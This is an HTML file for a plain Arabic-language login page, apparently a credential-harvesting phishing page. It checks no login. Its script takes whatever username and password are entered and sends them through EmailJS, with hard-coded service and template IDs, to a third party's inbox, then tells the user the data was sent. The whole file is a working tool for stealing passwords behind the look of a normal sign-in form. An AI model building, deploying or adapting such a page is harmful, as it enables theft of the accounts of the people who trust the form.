<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            direction: rtl;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            text-align: center;
            background-color: white;
            padding: 20px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            border-radius: 10px;
            width: 300px;
        }

        h1 {
            color: #333;
        }

        form input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
        }

        form button {
            background-color: #4CAF50;
            color: white;
            border: none;
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            border-radius: 5px;
        }

        form button:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <h1>تسجيل الدخول</h1>
        <form id="login-form">
            <input type="text" id="username" name="username" placeholder="اسم المستخدم" required>
            <input type="password" id="password" name="password" placeholder="كلمة المرور" required>
            <button type="submit">تسجيل الدخول</button>
        </form>
    </div>

    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script>
        // تهيئة EmailJS
        emailjs.init("1xqwBMfecM1SSulsh");

        // عندما يتم إرسال النموذج
        document.getElementById('login-form').onsubmit = function(event) {
            event.preventDefault();

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // إنشاء الرسالة
            const message = {
                username: username,
                password: password
            };

            // إرسال البيانات عبر EmailJS
            emailjs.send("service_ir3vg5y", "template_jw2qkzr", message)
                .then(function(response) {
                    alert("تم إرسال البيانات بنجاح!");
                }, function(error) {
                    alert("فشل في إرسال البيانات. حاول مرة أخرى.");
                    console.error(error);
                });
        };
    </script>

</body>
</html>
